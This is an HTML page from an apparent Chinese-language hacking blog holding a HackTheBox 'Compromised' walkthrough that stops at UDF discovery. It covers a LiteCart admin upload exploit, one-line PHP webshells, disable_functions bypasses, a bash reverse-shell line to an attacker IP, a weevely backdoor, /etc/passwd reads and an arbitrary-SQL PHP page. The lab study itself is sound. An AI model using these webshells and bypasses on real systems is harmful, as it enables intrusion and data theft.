@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"evilarsene.icu","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+  <meta name="description" content="首页发现web应用LiteCart，这是开源的:项目地址">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB:Compromised">
+<meta property="og:url" content="http://evilarsene.icu/2021/06/01/HTB-Compromised/index.html">
+<meta property="og:site_name" content="Love ❤ Hacking">
+<meta property="og:description" content="首页发现web应用LiteCart，这是开源的:项目地址">
+<meta property="og:locale">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/1.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/2.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/4.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/3.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/5.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/6.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/9.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/7.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/8.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/10.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/11.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/12.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/13.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/14.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/15.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/16.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/17.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/18.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/19.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/20.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/26.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/21.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/22.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/24.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/23.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/25.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/27.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Compromised/28.png">
+<meta property="article:published_time" content="2021-06-01T14:05:00.000Z">
+<meta property="article:modified_time" content="2021-06-01T14:10:55.212Z">
+<meta property="article:author" content="EvilArsene">
+<meta property="article:tag" content="Linux靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://evilarsene.icu/images/Compromised/1.png">
+
+<link rel="canonical" href="http://evilarsene.icu/2021/06/01/HTB-Compromised/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>HTB:Compromised | Love ❤ Hacking</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://github.com/TZESS" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Love ❤ Hacking</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">trickster</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://evilarsene.icu/2021/06/01/HTB-Compromised/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="EvilArsene">
+      <meta itemprop="description" content="人格面具操控者 <img src="http://www.hackthebox.eu/badge/image/278745" alt="Hack The Box">">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Love ❤ Hacking">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB:Compromised
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-06-01 22:05:00 / 修改时间：22:10:55" itemprop="dateCreated datePublished" datetime="2021-06-01T22:05:00+08:00">2021-06-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackTheBox/" itemprop="url" rel="index"><span itemprop="name">HackTheBox</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><p><img src="/images/Compromised/1.png" alt="1"></p>
+<p>首页发现web应用<code>LiteCart</code>，这是开源的:<a target="_blank" rel="noopener" href="https://github.com/litecart">项目地址</a></p>
+<p><img src="/images/Compromised/2.png" alt="2"></p>
+<p>搜索公开漏洞，发现文件上传<code>45267.py</code>，不过需要凭据</p>
+<p><img src="/images/Compromised/4.png" alt="4"></p>
+<p>web目录枚举</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster -u http:&#x2F;&#x2F;10.10.10.207&#x2F; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-medium-directories.txt -n -f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Compromised/3.png" alt="3"></p>
+<p>发现backup目录，存在压缩包a.tar.gz</p>
+<p><img src="/images/Compromised/5.png" alt="5"></p>
+<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>检查压缩包，发现只是tar</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file a.tar.gz                                                                                                </span><br><span class="line">a.tar.gz: POSIX tar archive (GNU)</span><br><span class="line">$tar xvf a.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>看上去是一个Web目录的备份</p>
+<p><img src="/images/Compromised/6.png" alt="6"></p>
+<p>查看robots.txt是否存在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$curl -s http:&#x2F;&#x2F;10.10.10.207&#x2F;shop&#x2F;robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Allow: &#x2F;</span><br><span class="line">Disallow: *&#x2F;cache&#x2F;*</span><br><span class="line">Sitemap: &#x2F;feeds&#x2F;sitemap.xml</span><br></pre></td></tr></table></figure>
+
+<p>其中还有个Webshell文件<code>.sh.php</code>，但这个是不存在的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在admin目录发现了<code>login.php</code>，也就是后台登陆地址</p>
+<p><img src="/images/Compromised/9.png" alt="9"></p>
+<p>接着搜寻<code>password</code>关键词，发现了<code>config.inc.php</code>文件</p>
+<p><img src="/images/Compromised/7.png" alt="7"></p>
+<p>查看得到MySQL数据库连接凭据，不确定是否为真实存在</p>
+<p><img src="/images/Compromised/8.png" alt="8"></p>
+<p>到这里，就需要仔细检查Web目录，看能不能找到一些硬编码的东西</p>
+<p>在<code>admin/login.php</code>中发现一条注释，提示了<code>.log2301c9430d8593ae.txt</code>，看上去好像存放了登陆密码</p>
+<p><img src="/images/Compromised/10.png" alt="10"></p>
+<p>尝试访问该文件，得到凭据<code>admin/theNextGenSt0r3!~</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$curl -s &quot;http:&#x2F;&#x2F;10.10.10.207&#x2F;shop&#x2F;admin&#x2F;.log2301c9430d8593ae.txt&quot;</span><br><span class="line">User: admin Passwd: theNextGenSt0r3!~</span><br></pre></td></tr></table></figure>
+
+<p>使用改凭据成功登陆后台</p>
+<p>登陆后提示了异地登陆，该机器可能有其他攻击者</p>
+<p><img src="/images/Compromised/11.png" alt="11"></p>
+<p>使用之前的python脚本快速完成Exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 45267.py -u admin -p &#39;theNextGenSt0r3!~&#39; -t http:&#x2F;&#x2F;10.10.10.207&#x2F;shop&#x2F;admin&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Compromised/12.png" alt="12"></p>
+<p>返回了shell地址，访问为空，似乎<code>c=id</code>参数没有生效</p>
+<p><img src="/images/Compromised/13.png" alt="13"></p>
+<p>查看python脚本内容，代码比较简单，只是上传了简单的一句话木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php if( isset( $_REQUEST[&#39;c&#39;] ) ) &#123; system( $_REQUEST[&#39;c&#39;] . &#39; 2&gt;&amp;1&#39; ); &#125; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>为了定位问题，我手动上传一个phpinfo页面。注意python脚本里的Content-Type要做修改</p>
+<p><img src="/images/Compromised/14.png" alt="14"></p>
+<p>页面成功解析，地址在<code>http://10.10.10.207/shop/vqmod/xml/a.php</code></p>
+<p><img src="/images/Compromised/15.png" alt="15"></p>
+<p>查看禁用的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">$echo -n system,passthru,popen,shell_exec,proc_open,exec,fsockopen,socket_create,curl_exec,curl_multi_exec,mail,putenv,imap_open,parse_ini_file,show_source,file_put_contents,fwrite,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals |sed &#39;s&#x2F;,&#x2F;\n&#x2F;g&#39;</span><br><span class="line"></span><br><span class="line">system</span><br><span class="line">passthru</span><br><span class="line">popen</span><br><span class="line">shell_exec</span><br><span class="line">proc_open</span><br><span class="line">exec</span><br><span class="line">fsockopen</span><br><span class="line">socket_create</span><br><span class="line">curl_exec</span><br><span class="line">curl_multi_exec</span><br><span class="line">mail</span><br><span class="line">putenv</span><br><span class="line">imap_open</span><br><span class="line">parse_ini_file</span><br><span class="line">show_source</span><br><span class="line">file_put_contents</span><br><span class="line">fwrite</span><br><span class="line">pcntl_alarm</span><br><span class="line">pcntl_fork</span><br><span class="line">pcntl_waitpid</span><br><span class="line">pcntl_wait</span><br><span class="line">pcntl_wifexited</span><br><span class="line">pcntl_wifstopped</span><br><span class="line">pcntl_wifsignaled</span><br><span class="line">pcntl_wifcontinued</span><br><span class="line">pcntl_wexitstatus</span><br><span class="line">pcntl_wtermsig</span><br><span class="line">pcntl_wstopsig</span><br><span class="line">pcntl_signal</span><br><span class="line">pcntl_signal_get_handler</span><br><span class="line">pcntl_signal_dispatch</span><br><span class="line">pcntl_get_last_error</span><br><span class="line">pcntl_strerror</span><br><span class="line">pcntl_sigprocmask</span><br><span class="line">pcntl_sigwaitinfo</span><br><span class="line">pcntl_sigtimedwait</span><br><span class="line">pcntl_exec</span><br><span class="line">pcntl_getpriority</span><br><span class="line">pcntl_setpriority</span><br><span class="line">pcntl_async_signals</span><br></pre></td></tr></table></figure>
+
+<p>除了常见的系统函数system、exec、passthru，诸如putenv、pcntl_exec、mail、fwrite这样的函数也被禁用了</p>
+<h2 id="方法1-bypass-disable-functions"><a href="#方法1-bypass-disable-functions" class="headerlink" title="方法1 bypass disable_functions"></a>方法1 bypass disable_functions</h2><h3 id="chankro-失败"><a href="#chankro-失败" class="headerlink" title="chankro(失败)"></a>chankro(失败)</h3><p>chankro的使用需要编辑一个shell脚本，知道对方架构，知道文件上传后的目录位置</p>
+<p>编辑shell.sh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.12&#x2F;4444 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>目录位置可以从PHP的SCRIPT_FILENAME处得知</p>
+<p><img src="/images/Compromised/16.png" alt="16"></p>
+<p>使用chankro</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python chankro.py --arch 64 --input shell.sh --output shell.php --path &#x2F;var&#x2F;www&#x2F;html&#x2F;shop&#x2F;vqmod&#x2F;xml&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>查看代码，确实使用了mail和put_env，所以我不会尝试它</p>
+<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>在Freebuf上找到了一篇<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/258756.html">文章</a>关于绕过PHP函数的</p>
+<h3 id="debug-backtrace-成功"><a href="#debug-backtrace-成功" class="headerlink" title="debug_backtrace(成功)"></a>debug_backtrace(成功)</h3><p>HackTricks上的一个<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-7.0-7.4-nix-only">文章</a>使用<code>debug_backtrace</code>进行绕过，这需要目标机器为Linux并且使用php7.0~7.4。正好目标完全符合</p>
+<p>上传后，默认执行的<code>uname -a</code>成功</p>
+<p><img src="/images/Compromised/17.png" alt="17"></p>
+<h3 id="gc-collect-cycle-成功"><a href="#gc-collect-cycle-成功" class="headerlink" title="gc_collect_cycle(成功)"></a>gc_collect_cycle(成功)</h3><p>找到了一个<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits">项目</a>，里面使用了<code>gc_collect_cycle</code>函数进行绕过</p>
+<p><img src="/images/Compromised/18.png" alt="18"></p>
+<h3 id="AntSword"><a href="#AntSword" class="headerlink" title="AntSword"></a>AntSword</h3><p>AntSword有一个<a target="_blank" rel="noopener" href="https://github.com/Medicean/as_bypass_php_disable_functions">bypass_php_disable_functions</a>的扩展模块。使用它可以快速完成测试</p>
+<p>上传shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>
+
+<p>连接之后使用辅助模块</p>
+<p><img src="/images/Compromised/19.png" alt="19"></p>
+<p>慢慢尝试，总能找到可以绕过的，原理都一样</p>
+<p><img src="/images/Compromised/20.png" alt="20"></p>
+<h3 id="未完成Reverse-Shell-iptables-bypass"><a href="#未完成Reverse-Shell-iptables-bypass" class="headerlink" title="未完成Reverse_Shell(iptables bypass)"></a>未完成Reverse_Shell(iptables bypass)</h3><p>尝试了几次反弹shell都没有成功，机器上存在curl，但curl kali的80也没反应，似乎存在流量限制</p>
+<p>尝试寻找iptables文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F;etc -type f |grep iptable</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Compromised/26.png" alt="26"></p>
+<p>抓取防火墙规则文件，发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># Generated by iptables-save v1.6.1 on Mon May 11 02:27:29 2020</span><br><span class="line">*filter</span><br><span class="line">:INPUT DROP [6:1032]</span><br><span class="line">:FORWARD DROP [0:0]</span><br><span class="line">:OUTPUT DROP [5:394]</span><br><span class="line">-A INPUT -i lo -j ACCEPT</span><br><span class="line">-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m tcp --dport 22 -m tcp -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m tcp --dport 80 -m tcp -j ACCEPT</span><br><span class="line">-A INPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT</span><br><span class="line">-A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT</span><br><span class="line">-A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">-A OUTPUT -p tcp -m tcp --sport 22 -m tcp -j ACCEPT</span><br><span class="line">-A OUTPUT -p tcp -m tcp --sport 80 -m tcp -j ACCEPT</span><br><span class="line">COMMIT</span><br><span class="line"># Completed on Mon May 11 02:27:29 2020</span><br></pre></td></tr></table></figure>
+
+<p>对外访问的端口必须从本地端口22或者80端口发起连接，这是反弹shell无法完成的原因。正常反弹shell会从一个随机高端口建立连接(比如53138)，这里<code>iptables</code>是不允许的</p>
+<h2 id="方法2-连接mysql"><a href="#方法2-连接mysql" class="headerlink" title="方法2 连接mysql"></a>方法2 连接mysql</h2><p>该机器限制了很多关于命令执行和写入的函数，但是没有限制文件读取和目录枚举，我们可以使用如下的php文件进行文件读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_REQUEST[&#39;file&#39;])) &#123; </span><br><span class="line">    echo file_get_contents($_REQUEST[&#39;file&#39;]);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&#39;dir&#39;])) &#123;</span><br><span class="line">    print_r(scandir($_REQUEST[&#39;dir&#39;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不过为了更好的扩展性，这里使用weevely，首先生成shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate password123 shell.php</span><br></pre></td></tr></table></figure>
+
+<p>上传后进行连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http:&#x2F;&#x2F;10.10.10.207&#x2F;shop&#x2F;vqmod&#x2F;xml&#x2F;shell.php password123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Compromised/21.png" alt="21"></p>
+<p>读取<code>/etc/passwd</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:file_read &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Compromised/22.png" alt="22"></p>
+<p>有一件事值得注意，mysql拥有登陆后的bash shell，通常这个值应该为<code>/bin/false</code></p>
+<p>由于我们之前已经获取了数据库连接凭据，也许我们能够上传php文件，接受我们输入的参数来完成sql查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$conn &#x3D; new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;changethis&quot;, &quot;ecom&quot;);</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">    die(&quot;Failed: &quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;Seccuess&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$result &#x3D; mysqli_query($conn, $_REQUEST[&#39;query&#39;]);</span><br><span class="line">while ($row &#x3D; $result-&gt;fetch_row()) &#123;</span><br><span class="line">    foreach ($row as $r) &#123;</span><br><span class="line">        echo $r;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看起来连接成功了</p>
+<p><img src="/images/Compromised/24.png" alt="24"></p>
+<p>尝试执行sql语句</p>
+<p><img src="/images/Compromised/23.png" alt="23"></p>
+<p>还是回到weevely进行操作，这样看起来更舒服</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@compromised:&#x2F;var&#x2F;www&#x2F;html&#x2F;shop&#x2F;vqmod&#x2F;xml PHP&gt; :sql_console -user root -passwd changethis</span><br><span class="line">root@localhost SQL&gt; show databases;</span><br><span class="line"> </span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| ecom               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>
+
+<p>发现了现存的UDF函数，可以执行系统命令</p>
